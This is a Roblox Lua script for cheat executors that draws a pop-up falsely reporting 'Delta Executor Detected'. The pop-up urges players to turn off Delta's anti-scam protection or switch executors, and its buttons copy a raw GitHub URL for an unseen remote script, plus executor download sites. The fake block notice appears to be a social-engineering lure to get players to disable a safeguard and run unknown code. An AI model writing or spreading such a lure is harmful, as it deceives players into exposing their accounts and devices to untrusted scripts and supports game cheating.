local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ExecutorBlockerUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 500, 0, 300)
mainFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- UICorner
local corner = Instance.new("UICorner", mainFrame)
corner.CornerRadius = UDim.new(0, 8)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "🚫 Delta Executor Detected"
title.TextColor3 = Color3.fromRGB(255, 70, 70)
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.Parent = mainFrame

-- Subtitle
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -20, 0, 40)
subtitle.Position = UDim2.new(0, 10, 0, 40)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Your executor is blocked.\n\nFix this:\n• Turn off anti-scam in Delta\n• Or use Krnl / Codex instead"
subtitle.TextColor3 = Color3.fromRGB(230, 230, 230)
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 16
subtitle.TextWrapped = true
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.TextYAlignment = Enum.TextYAlignment.Top
subtitle.Parent = mainFrame

-- Script Box
local scriptBox = Instance.new("TextBox")
scriptBox.Size = UDim2.new(1, -40, 0, 35)
scriptBox.Position = UDim2.new(0, 20, 0, 160)
scriptBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
scriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
scriptBox.Font = Enum.Font.Code
scriptBox.TextSize = 16
scriptBox.Text = [[https://raw.githubusercontent.com/DarkscriptHUBS/Gunggungka/refs/heads/main/Boboka9.lua]]
scriptBox.ClearTextOnFocus = false
scriptBox.TextXAlignment = Enum.TextXAlignment.Left
scriptBox.Parent = mainFrame

-- Button Creator
local function createButton(text, position, color)
	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0.3, 0, 0, 35)
	button.Position = position
	button.BackgroundColor3 = color
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.Font = Enum.Font.GothamBold
	button.TextSize = 16
	button.Text = text
	button.Parent = mainFrame

	local corner = Instance.new("UICorner", button)
	corner.CornerRadius = UDim.new(0, 6)

	return button
end

-- Copy Script Button
local copyScriptBtn = createButton("📋 Copy Script", UDim2.new(0.35, 0, 0, 210), Color3.fromRGB(0, 140, 255))

-- Copy Krnl Button
local copyKrnlBtn = createButton("🌐 Copy Krnl", UDim2.new(0.1, 0, 0, 260), Color3.fromRGB(0, 100, 255))

-- Copy Codex Button
local copyCodexBtn = createButton("🌐 Copy Codex", UDim2.new(0.6, 0, 0, 260), Color3.fromRGB(0, 100, 255))

-- Clipboard logic
local function copyToClipboard(text)
	setclipboard(text)
end

copyScriptBtn.MouseButton1Click:Connect(function()
	copyToClipboard(scriptBox.Text)
end)

copyKrnlBtn.MouseButton1Click:Connect(function()
	copyToClipboard("https://krnl.place/")
end)

copyCodexBtn.MouseButton1Click:Connect(function()
	copyToClipboard("https://codex.lol/")
end)
